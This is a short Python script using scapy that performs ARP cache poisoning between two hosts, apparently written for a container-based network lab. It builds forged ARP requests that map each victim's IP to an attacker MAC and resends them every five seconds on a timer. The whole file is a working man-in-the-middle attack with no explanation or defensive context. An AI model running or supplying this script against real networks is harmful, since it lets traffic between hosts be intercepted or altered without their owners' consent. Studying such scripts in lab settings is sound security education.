#!/usr/bin/env python3
from scapy.all import *
from threading import Timer

def poison():
    sendp(pkt_a)
    sendp(pkt_b)
    Timer(5, poison).start()

E = Ether()
A = ARP()

A.op = 1	# 1 for ARP request; 2 for ARP reply
A.hwsrc = '02:42:0a:09:00:69'	# source MAC	M's MAC
A.psrc = '10.9.0.6'		# source IP	B's IP
A.pdst = '10.9.0.5'		# destination IP	A's IP
pkt_a = E/A	# packet to poison A's ARP cache

A.op = 1	# 1 for ARP request; 2 for ARP reply
A.hwsrc = '02:42:0a:09:00:69'	# source MAC	M's MAC
A.psrc = '10.9.0.5'		# source IP	A's IP
A.pdst = '10.9.0.6'		# destination IP	B's IP
pkt_b = E/A	# packet to poison B's ARP cache
    
Timer(5, poison).start()
